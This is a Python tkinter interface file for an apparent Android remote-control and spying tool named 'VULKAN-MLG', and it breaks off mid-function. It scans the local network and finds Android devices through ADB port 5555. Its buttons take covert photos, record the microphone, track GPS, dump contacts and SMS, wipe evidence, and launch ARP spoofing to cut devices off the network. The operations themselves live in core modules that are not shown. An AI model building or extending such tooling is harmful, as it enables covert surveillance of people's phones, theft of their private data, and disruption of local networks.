# ui/modern_ui.py - Interfaz 
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, scrolledtext, filedialog
import threading
import os
import socket
import platform
from ui.styles import ModernStyles

class ModernUI:
    """Interfaz de usuario moderna y completa"""
    
    def __init__(self, root, core):
        self.root = root
        self.core = core
        self.loading = False
        self.colors = ModernStyles.COLORS
        
        # Variables para persistente
        self.persistent_active = False
        
        # Detectar sistema para emojis
        self.os_type = platform.system()
    
    def setup_ui(self):
        """Configurar interfaz completa"""
        # Aplicar tema
        ModernStyles.apply_theme(self.root)
        
        # Header
        self.setup_header()
        
        # Crear Notebook (pestañas)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Crear todas las pestañas
        self.create_devices_tab()
        self.create_control_tab()
        self.create_spy_tab()
        self.create_attack_tab()
        self.create_backup_tab()
        self.create_console_tab()
        
        # Barra de estado
        self.setup_statusbar()
        
        # Escaneo automático
        self.root.after(500, self.scan_devices)
    
    def setup_header(self):
        """Configurar cabecera"""
        # Línea de acento
        header_line = tk.Frame(self.root, bg=self.colors['accent'], height=3)
        header_line.pack(fill=tk.X)
        
        # Frame del título
        title_frame = tk.Frame(self.root, bg=self.colors['bg_sec'])
        title_frame.pack(fill=tk.X)
        
        # Título principal
        title_text = "🌋 VULKAN-MLG v12.0 - GOD MODE 🌋"
        if self.os_type == 'Windows':
            title = tk.Label(title_frame, text=title_text,
                            font=("Segoe UI Emoji", 20, "bold"),
                            bg=self.colors['bg_sec'],
                            fg=self.colors['info'])
        else:
            title = tk.Label(title_frame, text=title_text,
                            font=("Segoe UI", 20, "bold"),
                            bg=self.colors['bg_sec'],
                            fg=self.colors['info'])
        title.pack(pady=10)
        
        # Subtítulo
        subtitle = tk.Label(title_frame, text="Sistema de Control Total para Red Local | Compatible con Android",
                           font=("Segoe UI", 10),
                           bg=self.colors['bg_sec'],
                           fg=self.colors['text_dim'])
        subtitle.pack(pady=(0, 10))
    
    def setup_statusbar(self):
        """Configurar barra de estado"""
        self.status_bar = tk.Label(self.root, 
                                   text="✅ Sistema listo | Selecciona un dispositivo Android para control remoto",
                                   bg=self.colors['bg_sec'],
                                   fg=self.colors['text_dim'],
                                   font=("Segoe UI", 9),
                                   anchor=tk.W,
                                   padx=10)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    # ==================== PESTAÑA 1: DISPOSITIVOS ====================
    def create_devices_tab(self):
        """Crear pestaña de dispositivos"""
        tab = ModernStyles.create_frame(self.notebook, "bg")
        self.notebook.add(tab, text="📡 DISPOSITIVOS")
        
        # Treeview con columnas mejoradas
        columns = ("IP", "MAC", "NOMBRE", "LATENCIA", "TIPO")
        self.devices_tree = ttk.Treeview(tab, columns=columns, show="headings", height=18)
        
        for col in columns:
            self.devices_tree.heading(col, text=col)
            self.devices_tree.column(col, width=120, anchor=tk.CENTER)
        
        self.devices_tree.column("NOMBRE", width=200)
        self.devices_tree.column("TIPO", width=120)
        
        scroll = ttk.Scrollbar(tab, orient=tk.VERTICAL, command=self.devices_tree.yview)
        self.devices_tree.configure(yscrollcommand=scroll.set)
        
        self.devices_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        scroll.pack(side=tk.RIGHT, fill=tk.Y, pady=10)
        
        self.devices_tree.bind('<<TreeviewSelect>>', self.on_device_select)
        
        # Frame de botones
        btn_frame = ModernStyles.create_frame(tab, "bg")
        btn_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Botones
        btn_scan = ModernStyles.create_button(btn_frame, "🔄 ESCANEAR RÁPIDO", lambda: self.scan_devices(quick=True), "primary")
        btn_scan.pack(side=tk.LEFT, padx=5)
        
        btn_scan_full = ModernStyles.create_button(btn_frame, "🌐 ESCANEAR COMPLETO", lambda: self.scan_devices(quick=False), "warning")
        btn_scan_full.pack(side=tk.LEFT, padx=5)
        
        btn_select = ModernStyles.create_button(btn_frame, "🎯 SELECCIONAR", self.select_target, "success")
        btn_select.pack(side=tk.LEFT, padx=5)
        
        btn_refresh_adb = ModernStyles.create_button(btn_frame, "🔄 REFRESCAR ADB", self.refresh_adb_devices, "dark")
        btn_refresh_adb.pack(side=tk.LEFT, padx=5)
        
        # Info de dispositivos guardados
        saved_frame = ModernStyles.create_frame(tab, "sec")
        saved_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ModernStyles.create_label(saved_frame, "💾 DISPOSITIVOS GUARDADOS:", "dim").pack(side=tk.LEFT, padx=5)
        
        self.saved_combo = ttk.Combobox(saved_frame, values=[], state="readonly", width=30)
        self.saved_combo.pack(side=tk.LEFT, padx=5)
        
        btn_load_saved = ModernStyles.create_button(saved_frame, "CARGAR", self.load_saved_device, "default")
        btn_load_saved.pack(side=tk.LEFT, padx=5)
    
    # ==================== PESTAÑA 2: CONTROL ====================
    def create_control_tab(self):
        """Crear pestaña de control"""
        tab = ModernStyles.create_frame(self.notebook, "bg")
        self.notebook.add(tab, text="🎮 CONTROL")
        
        # Frame principal con scroll
        main_frame = ModernStyles.create_frame(tab, "bg")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Canvas para scroll
        canvas = tk.Canvas(main_frame, bg=self.colors['bg'], highlightthickness=0)
        scrollbar = ttk.Scrollbar(main_frame, orient=tk.VERTICAL, command=canvas.yview)
        scrollable_frame = ModernStyles.create_frame(canvas, "bg")
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Info del dispositivo objetivo
        info_frame = ModernStyles.create_label_frame(scrollable_frame, " 🎯 DISPOSITIVO OBJETIVO ")
        info_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.target_info = tk.Label(info_frame, text="❌ Ningún dispositivo seleccionado",
                                    bg=self.colors['panel'],
                                    fg=self.colors['error'],
                                    font=("Segoe UI", 11, "bold"))
        self.target_info.pack(pady=10)
        
        # Info adicional del dispositivo
        self.device_info_label = tk.Label(info_frame, text="",
                                          bg=self.colors['panel'],
                                          fg=self.colors['text_dim'],
                                          font=("Segoe UI", 9))
        self.device_info_label.pack(pady=(0, 10))
        
        # Controles principales - FILA 1: Navegación
        controls_frame1 = ModernStyles.create_label_frame(scrollable_frame, " 🕹️ CONTROLES DE NAVEGACIÓN ")
        controls_frame1.pack(fill=tk.X, padx=10, pady=10)
        
        # Botones de navegación
        nav_buttons = [
            ("🏠 INICIO", lambda: self.execute_action('home'), "primary", 0, 0),
            ("🔙 ATRÁS", lambda: self.execute_action('back'), "warning", 0, 1),
            ("🔊 SUBIR VOLUMEN", lambda: self.execute_action('volume_up'), "primary", 0, 2),
            ("🔉 BAJAR VOLUMEN", lambda: self.execute_action('volume_down'), "primary", 0, 3),
        ]
        
        for text, cmd, variant, row, col in nav_buttons:
            btn = ModernStyles.create_button(controls_frame1, text, cmd, variant, width=16)
            btn.grid(row=row, column=col, padx=5, pady=5)
        
        # Controles principales - FILA 2: Multimedia y acciones
        controls_frame2 = ModernStyles.create_label_frame(scrollable_frame, " 🎮 CONTROLES DE MULTIMEDIA ")
        controls_frame2.pack(fill=tk.X, padx=10, pady=10)
        
        media_buttons = [
            ("📱 VER PANTALLA", self.view_screen, "primary", 0, 0),
            ("📸 ABRIR CÁMARA", self.open_camera, "warning", 0, 1),
            ("🎥 GRABAR VIDEO", self.record_video, "warning", 0, 2),
            ("📁 EXPLORAR ARCHIVOS", self.open_file_explorer, "primary", 1, 0),
            ("🔒 BLOQUEAR", self.block_device, "danger", 1, 1),
            ("🔓 DESBLOQUEAR", self.unblock_device, "success", 1, 2),
            ("💀 MODO PERSISTENTE", self.toggle_persistent, "danger", 2, 0),
            ("📊 INFO DISPOSITIVO", self.show_device_info, "primary", 2, 1),
            ("🔌 DESCONECTAR", self.disconnect_device, "warning", 2, 2),
            ("🛡️ RESTAURAR TODO", self.restore_all, "success", 3, 1),
        ]
        
        for text, cmd, variant, row, col in media_buttons:
            btn = ModernStyles.create_button(controls_frame2, text, cmd, variant, width=18)
            btn.grid(row=row, column=col, padx=5, pady=5)
        
        # Estado persistente
        self.persist_status = ModernStyles.create_label(controls_frame2, "⚪ Modo persistente: INACTIVO", "dim")
        self.persist_status.grid(row=4, column=0, columnspan=3, pady=10)
        
        # Web y notificaciones
        web_frame = ModernStyles.create_label_frame(scrollable_frame, " 🌐 WEB Y NOTIFICACIONES ")
        web_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # URL
        url_frame = ModernStyles.create_frame(web_frame, "panel")
        url_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ModernStyles.create_label(url_frame, "URL:", "info").pack(side=tk.LEFT, padx=5)
        self.url_entry = ModernStyles.create_entry(url_frame, width=50)
        self.url_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.url_entry.insert(0, "https://www.google.com")
        
        btn_open = ModernStyles.create_button(url_frame, "🌐 ABRIR", self.open_webpage, "primary")
        btn_open.pack(side=tk.LEFT, padx=5)
        
        # Notificación
        notif_frame = ModernStyles.create_frame(web_frame, "panel")
        notif_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ModernStyles.create_label(notif_frame, "Mensaje:", "info").pack(side=tk.LEFT, padx=5)
        self.notify_entry = ModernStyles.create_entry(notif_frame, width=50)
        self.notify_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.notify_entry.insert(0, "🔥 Mensaje desde VULKAN-MLG")
        
        btn_notify = ModernStyles.create_button(notif_frame, "📨 ENVIAR", self.send_notification, "warning")
        btn_notify.pack(side=tk.LEFT, padx=5)
    
    # ==================== PESTAÑA 3: ESPIONAJE ====================
    def create_spy_tab(self):
        """Crear pestaña de espionaje"""
        tab = ModernStyles.create_frame(self.notebook, "bg")
        self.notebook.add(tab, text="🕵️ ESPIONAJE")
        
        # Panel izquierdo - acciones
        left_frame = ModernStyles.create_frame(tab, "bg")
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
        
        spy_actions = [
            ("📸 FOTO STEALTH", self.stealth_photo, "danger"),
            ("🎙️ GRABAR MICRÓFONO", self.record_mic, "danger"),
            ("📍 OBTENER GPS", self.get_gps, "warning"),
            ("📇 EXTRAER CONTACTOS", self.dump_contacts, "warning"),
            ("💬 EXTRAER SMS", self.dump_sms, "warning"),
            ("📱 APPS INSTALADAS", self.show_apps, "primary"),
            ("🗑️ LIMPIAR EVIDENCIA", self.wipe_evidence, "danger"),
        ]
        
        for text, cmd, variant in spy_actions:
            btn = ModernStyles.create_button(left_frame, text, cmd, variant, width=22)
            btn.pack(pady=5)
        
        # Panel derecho - resultados
        right_frame = ModernStyles.create_frame(tab, "sec")
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.spy_output = tk.Text(right_frame, bg=self.colors['bg_sec'],
                                  fg=self.colors['info'],
                                  font=("Consolas", 9),
                                  wrap=tk.WORD,
                                  relief=tk.FLAT)
        scroll = ttk.Scrollbar(right_frame, orient=tk.VERTICAL, command=self.spy_output.yview)
        self.spy_output.configure(yscrollcommand=scroll.set)
        
        self.spy_output.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
    
    # ==================== PESTAÑA 4: ATAQUES ====================
    def create_attack_tab(self):
        """Crear pestaña de ataques"""
        tab = ModernStyles.create_frame(self.notebook, "bg")
        self.notebook.add(tab, text="⚔️ ATAQUES")
        
        # Advertencia
        warning_frame = ModernStyles.create_frame(tab, "sec")
        warning_frame.pack(fill=tk.X, padx=10, pady=10)
        
        warning = tk.Label(warning_frame, 
                          text="⚠️ LAS SIGUIENTES ACCIONES AFECTAN LA RED LOCAL ⚠️\nSolo usar en dispositivos propios o con autorización",
                          bg=self.colors['bg_sec'],
                          fg=self.colors['warning'],
                          font=("Segoe UI", 10, "bold"),
                          justify=tk.CENTER)
        warning.pack(pady=10)
        
        # Botones de ataque
        attack_frame = ModernStyles.create_frame(tab, "bg")
        attack_frame.pack(expand=True, pady=20)
        
        attacks = [
            ("🔒 ARP SPOOFING (INICIAR)", self.start_arp_attack, "danger"),
            ("🔓 ARP SPOOFING (DETENER)", self.stop_arp_attack, "success"),
            ("💀 BLOQUEO PERSISTENTE", self.start_persistent_attack, "warning"),
            ("🛡️ RESTAURAR RED", self.restore_network, "success"),
        ]
        
        for text, cmd, variant in attacks:
            btn = ModernStyles.create_button(attack_frame, text, cmd, variant, width=30)
            btn.pack(pady=10)
        
        self.attack_status = ModernStyles.create_label(attack_frame, "⚪ Sin ataques activos", "dim")
        self.attack_status.pack(pady=20)
    
    # ==================== PESTAÑA 5: BACKUPS ====================
    def create_backup_tab(self):
        """Crear pestaña de backups"""
        tab = ModernStyles.create_frame(self.notebook, "bg")
        self.notebook.add(tab, text="💾 BACKUPS")
        
        # Frame principal centrado
        main_frame = ModernStyles.create_frame(tab, "bg")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Frame centrado
        center_frame = ModernStyles.create_frame(main_frame, "bg")
        center_frame.pack(expand=True)
        
        # Opciones de backup
        options_frame = ModernStyles.create_label_frame(center_frame, " 📦 OPCIONES DE BACKUP ")
        options_frame.pack(fill=tk.X, padx=20, pady=20)
        
        # Ruta de backup
        path_frame = ModernStyles.create_frame(options_frame, "panel")
        path_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ModernStyles.create_label(path_frame, "Destino:", "info").pack(side=tk.LEFT, padx=5)
        self.backup_path = ModernStyles.create_entry(path_frame, width=50)
        self.backup_path.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.backup_path.insert(0, os.path.join(os.getcwd(), "backups"))
        
        btn_select = ModernStyles.create_button(path_frame, "📂 SELECCIONAR", self.select_backup_folder, "dark")
        btn_select.pack(side=tk.LEFT, padx=5)
        
        # Botones de backup en grid
        btn_frame = ModernStyles.create_frame(options_frame, "bg")
        btn_frame.pack(pady=15)
        
        backups = [
            ("💾 BACKUP COMPLETO", self.full_backup, "success"),
            ("📱 SOLO APLICACIONES", self.apps_backup, "primary"),
            ("📸 FOTOS Y VIDEOS", self.media_backup, "primary"),
            ("📇 CONTACTOS Y SMS", self.contacts_backup, "warning"),
            ("🔄 RESTAURAR BACKUP", self.restore_backup, "warning"),
        ]
        
        for i, (text, cmd, variant) in enumerate(backups):
            row = i // 2
            col = i % 2
            btn = ModernStyles.create_button(btn_frame, text, cmd, variant, width=25)
            btn.grid(row=row, column=col, padx=10, pady=5)
        
        # Progreso (inicialmente oculto)
        self.backup_progress = ttk.Progressbar(options_frame, mode='indeterminate', length=300)
        self.backup_status = ModernStyles.create_label(options_frame, "", "dim")
        
        self.backup_progress.pack_forget()
        self.backup_status.pack_forget()
    
    # ==================== PESTAÑA 6: CONSOLA ====================
    def create_console_tab(self):
        """Crear pestaña de consola"""
        tab = ModernStyles.create_frame(self.notebook, "bg")
        self.notebook.add(tab, text="💻 CONSOLA")
        
        # Consola de texto
        self.console = scrolledtext.ScrolledText(tab, 
                                                  bg=self.colors['bg_sec'],
                                                  fg=self.colors['info'],
                                                  font=("Consolas", 9),
                                                  wrap=tk.WORD,
                                                  relief=tk.FLAT)
        self.console.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Configurar logger
        self.core.logger.set_widget(self.console)
        
        # Entrada de comandos
        cmd_frame = ModernStyles.create_frame(tab, "sec")
        cmd_frame.pack(fill=tk.X, padx=10, pady=10)
        
        adb_label = tk.Label(cmd_frame, text="ADB>", 
                            bg=self.colors['bg_sec'], 
                            fg=self.colors['info'], 
                            font=("Consolas", 11, "bold"))
        adb_label.pack(side=tk.LEFT, padx=5)
        
        self.cmd_entry = ModernStyles.create_entry(cmd_frame)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.cmd_entry.bind('<Return>', self.execute_adb_command)
        
        btn_exec = ModernStyles.create_button(cmd_frame, "EJECUTAR", lambda: self.execute_adb_command(None), "primary")
        btn_exec.pack(side=tk.LEFT, padx=5)
    
    # ==================== FUNCIONES PRINCIPALES ====================
    
    def log(self, message):
        """Escribir en consola"""
        self.core.logger.log(message)
    
    def show_backup_progress(self, show=True):
        """Mostrar u ocultar barra de progreso"""
        if show:
            self.backup_progress.pack(pady=10)
            self.backup_status.pack()
            self.backup_progress.start()
        else:
            self.backup_progress.stop()
            self.backup_progress.pack_forget()
            self.backup_status.pack_forget()
            self.backup_status.config(text="")
    
    def scan_devices(self, quick=True):
        """Escanear dispositivos"""
        if self.loading:
            self.status_bar.config(text="⏳ Ya hay un escaneo en curso...")
            return
        
        self.loading = True
        self.status_bar.config(text="🔍 Escaneando red... (esto puede tomar unos segundos)")
        
        # Limpiar árbol
        for item in self.devices_tree.get_children():
            self.devices_tree.delete(item)
        
        # Agregar elemento de carga
        loading_item = self.devices_tree.insert("", tk.END, values=("...", "...", "ESCANEANDO...", "...", "🔄"))
        
        def update_devices(devices):
            # Eliminar elemento de carga
            self.devices_tree.delete(loading_item)
            
            for device in devices:
                tipo = device.get('type', '📡 Desconocido')
                self.devices_tree.insert("", tk.END, values=(
                    device.get('ip', 'N/A'),
                    device.get('mac', 'N/A'),
                    device.get('name', 'Desconocido'),
                    device.get('latency', 'Online'),
                    tipo
                ))
            
            # Actualizar barra de estado
            android_count = sum(1 for d in devices if 'Android' in d.get('type', ''))
            pc_count = sum(1 for d in devices if 'PC' in d.get('type', ''))
            
            status_msg = f"📡 {len(devices)} dispositivos encontrados "
            if android_count > 0:
                status_msg += f"(📱 {android_count} Android"
                if pc_count > 0:
                    status_msg += f", 💻 {pc_count} PC"
                status_msg += ")"
            
            self.status_bar.config(text=status_msg)
            self.loading = False
            
            if len(devices) == 0:
                self.log("⚠️ No se encontraron dispositivos. Verifica tu conexión de red.")
            else:
                self.log(f"✅ Escaneo completado: {len(devices)} dispositivos")
        
        if quick and hasattr(self.core.network_scanner, 'quick_scan'):
            self.core.scan_network(update_devices)
        else:
            self.core.scan_network(update_devices)
    
    def refresh_adb_devices(self):
        """Refrescar dispositivos ADB conectados"""
        self.log("🔄 Buscando dispositivos ADB...")
        if self.core.adb_controller:
            result = self.core.adb_controller.run_command("devices")
            self.log(f"Dispositivos ADB:\n{result[0]}")
    
    def check_if_android(self, ip):
        """Verificar si IP es dispositivo Android"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex((ip, 5555))
            sock.close()
            return result == 0
        except:
            return False
    
    def on_device_select(self, event):
        """Seleccionar dispositivo"""
        selection = self.devices_tree.selection()
        if selection:
            values = self.devices_tree.item(selection[0])['values']
            
            ip = values[0]
            name = values[2]
            device_type = values[4] if len(values) > 4 else "📡 Desconocido"
            
            # Detectar si es Android
            is_android = "Android" in device_type or self.check_if_android(ip)
            
            device = {
                'ip': ip, 
                'mac': values[1], 
                'name': name,
                'type': device_type,
                'is_android': is_android
            }
            
            self.core.select_device(device)
            
            if is_android:
                self.target_info.config(text=f"🎯 {name} [{ip}] - Android detectado", 
                                       fg=self.colors['success'])
                self.root.after(500, self.show_device_info)
            else:
                self.target_info.config(text=f"🎯 {name} [{ip}] - Solo archivos", 
                                       fg=self.colors['warning'])
                self.device_info_label.config(text="⚠️ Solo exploración de archivos disponible")
    
    def select_target(self):
        """Seleccionar objetivo"""
        selection = self.devices_tree.selection()
        if not selection:
            messagebox.showwarning("Error", "Selecciona un dispositivo de la lista")
            return
        self.on_device_select(None)
        messagebox.showinfo("Éxito", "Dispositivo seleccionado como objetivo")
    
    def load_saved_device(self):
        """Cargar dispositivo guardado"""
        selection = self.saved_combo.get()
        if selection:
            self.log(f"📱 Cargando dispositivo guardado: {selection}")
    
    def show_device_info(self):
        """Mostrar información del dispositivo"""
        if not self.core.selected_device:
            return
        
        if not self.core.selected_device.get('is_android', False):
            self.device_info_label.config(text="ℹ️ No es un dispositivo Android")
            return
        
        def get_info():
            if self.core.adb_controller:
                info = self.core.adb_controller.get_device_info()
                if info:
                    info_text = f"📱 {info.get('brand', '')} {info.get('model', '')} | Android {info.get('android_version', '')}"
                    self.root.after(0, lambda: self.device_info_label.config(text=info_text))
                    self.root.after(0, lambda: self.log(f"Info dispositivo: {info_text}"))
                else:
                    self.root.after(0, lambda: self.device_info_label.config(text="⚠️ No se pudo obtener información"))
        
        threading.Thread(target=get_info, daemon=True).start()
    
    def disconnect_device(self):
        """Desconectar dispositivo"""
        if self.core.selected_device:
            if self.core.adb_controller:
                self.core.adb_controller.disconnect_device()
            self.core.selected_device = None
            self.target_info.config(text="❌ Ningún dispositivo seleccionado", fg=self.colors['error'])
            self.device_info_label.config(text="")
            self.log("🔌 Dispositivo desconectado")
    
    def view_screen(self):
        """Ver pantalla"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        self.log("📱 Abriendo pantalla...")
        self.core.view_screen()
    
    def open_camera(self):
        """Abrir cámara"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        self.log("📸 Abriendo cámara...")
        result = self.core.open_camera()
        self.log(result)
    
    def record_video(self):
        """Grabar video"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        self.log("🎥 Iniciando grabación...")
        result = self.core.record_video()
        self.log(result)
    
    def open_file_explorer(self):
        """Abrir explorador de archivos"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo de la lista")
            return
        
        from tools.file_explorer import FileExplorer
        
        if self.core.selected_device.get('is_android', False) or 'Android' in self.core.selected_device.get('type', ''):
            mode = "android"
            self.log(f"📱 Abriendo explorador para Android: {self.core.selected_device['name']}")
        else:
            mode = "pc"
            self.log(f"💻 Abriendo explorador local: {self.core.selected_device['name']}")
        
        explorer = FileExplorer(
            self.root,
            mode=mode,
            device_ip=self.core.selected_device['ip'] if mode == "android" else None,
            device_name=self.core.selected_device.get('name', 'Dispositivo'),
            log_callback=self.log
        )
        explorer.open()
    
    def block_device(self):
        """Bloquear dispositivo"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo")
            return
        
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Advertencia", "Este dispositivo no parece ser Android")
            return
        
        if not messagebox.askyesno(
            "⚠️ CONFIRMACIÓN ⚠️",
            f"¿Estás seguro de que quieres BLOQUEAR {self.core.selected_device['name']}?\n\n"
            "Esto hará que el dispositivo pierda conectividad a internet hasta que lo desbloquees."
        ):
            return
        
        self.core.block_device()
        if hasattr(self, 'attack_status'):
            self.attack_status.config(text="🔴 ATAQUE ACTIVO - Dispositivo bloqueado", fg=self.colors['error'])
        self.log(f"🔒 Bloqueo activado en {self.core.selected_device['name']}")
    
    def unblock_device(self):
        """Desbloquear dispositivo"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo")
            return
        
        self.core.unblock_device()
        if hasattr(self, 'attack_status'):
            self.attack_status.config(text="⚪ Dispositivo desbloqueado", fg=self.colors['text_dim'])
        self.log(f"🔓 Desbloqueado: {self.core.selected_device['name']}")
    
    def toggle_persistent(self):
        """Alternar modo persistente"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo")
            return
        
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Advertencia", "Este dispositivo no parece ser Android")
            return
        
        self.persistent_active = not self.persistent_active
        if self.persistent_active:
            self.core.block_device()
            self.persist_status.config(text="🔴 Modo persistente: ACTIVO", fg=self.colors['error'])
            self.log("💀 Modo persistente ACTIVADO")
        else:
            self.core.unblock_device()
            self.persist_status.config(text="⚪ Modo persistente: INACTIVO", fg=self.colors['text_dim'])
            self.log("Modo persistente DESACTIVADO")
    
    def restore_all(self):
        """Restaurar todo"""
        if not messagebox.askyesno("Restaurar", "¿Restaurar todas las configuraciones y detener todos los ataques?"):
            return
        
        self.core.restore_all()
        self.persistent_active = False
        
        if hasattr(self, 'attack_status'):
            self.attack_status.config(text="⚪ Sistema restaurado", fg=self.colors['success'])
        if hasattr(self, 'persist_status'):
            self.persist_status.config(text="⚪ Modo persistente: INACTIVO", fg=self.colors['text_dim'])
        
        self.log("🛡️ Sistema completamente restaurado")
        messagebox.showinfo("Éxito", "Sistema restaurado correctamente")
    
    def open_webpage(self):
        """Abrir página web"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        url = simpledialog.askstring("URL", "Ingresa la URL:", initialvalue=self.url_entry.get())
        if url:
            result = self.core.open_webpage(url)
            self.log(result)
    
    def send_notification(self):
        """Enviar notificación"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        msg = self.notify_entry.get().strip()
        if msg:
            result = self.core.send_notification(msg)
            self.log(result)
    
    def execute_action(self, action):
        """Ejecutar acción simple"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo")
            return
        result = self.core.execute_action(action)
        self.log(result)
    
    # ==================== FUNCIONES ESPÍA ====================
    
    def log_spy(self, message):
        """Log para pestaña espía"""
        self.spy_output.insert(tk.END, f"{message}\n")
        self.spy_output.see(tk.END)
        self.log(message)
    
    def stealth_photo(self):
        """Foto stealth"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        self.log_spy("📸 Tomando foto stealth...")
        result = self.core.stealth_photo()
        self.log_spy(f"   Resultado: {result}")
    
    def record_mic(self):
        """Grabar micrófono"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        duration = simpledialog.askinteger("Duración", "Segundos de grabación:", initialvalue=30, minvalue=1, maxvalue=300)
        if duration:
            self.log_spy(f"🎙️ Grabando micrófono por {duration} segundos...")
            self.core.record_mic(duration)
    
    def get_gps(self):
        """Obtener GPS"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        self.log_spy("📍 Obteniendo GPS...")
        result = self.core.get_gps()
        if result:
            self.log_spy(f"   Latitud: {result.get('lat', 'N/A')}")
            self.log_spy(f"   Longitud: {result.get('lon', 'N/A')}")
    
    def dump_contacts(self):
        """Extraer contactos"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        self.log_spy("📇 Extrayendo contactos...")
        result = self.core.dump_contacts()
        self.log_spy(f"   Guardado en: {result}")
    
    def dump_sms(self):
        """Extraer SMS"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        self.log_spy("💬 Extrayendo SMS...")
        result = self.core.dump_sms()
        self.log_spy(f"   Guardado en: {result}")
    
    def show_apps(self):
        """Mostrar aplicaciones"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo Android")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        self.log_spy("📱 Obteniendo aplicaciones instaladas...")
        
        def display_apps(apps):
            if apps:
                self.log_spy(f"\n✅ {len(apps)} aplicaciones encontradas:\n")
                for i, app in enumerate(apps[:30], 1):
                    name = app.get('name', app.get('package', 'Unknown'))
                    self.log_spy(f"   {i:2}. {name}")
                if len(apps) > 30:
                    self.log_spy(f"\n   ... y {len(apps)-30} más")
            else:
                self.log_spy("   ⚠️ No se pudieron obtener aplicaciones")
        
        self.core.get_installed_apps_async(display_apps)
    
    def wipe_evidence(self):
        """Limpiar evidencia"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo")
            return
        if not self.core.selected_device.get('is_android', False):
            messagebox.showwarning("Error", "Este dispositivo no parece ser Android")
            return
        
        if messagebox.askyesno("⚠️ Advertencia", "¿Eliminar toda evidencia del dispositivo?"):
            result = self.core.wipe_evidence()
            self.log_spy(f"🧹 {result}")
    
    # ==================== FUNCIONES ATAQUE ====================
    
    def start_arp_attack(self):
        """Iniciar ataque ARP"""
        if not self.core.selected_device:
            messagebox.showwarning("Error", "Selecciona un dispositivo")
            return
        if not messagebox.askyesno("⚠️ ADVERTENCIA", "¿Continuar?"):
            return
        self.block_device()
    
    def stop_arp_attack(self):
        """Detener ataque ARP"""
        self.unblock_device()
    
    def start_persistent_attack(self):
        """Iniciar ataque persistente"""
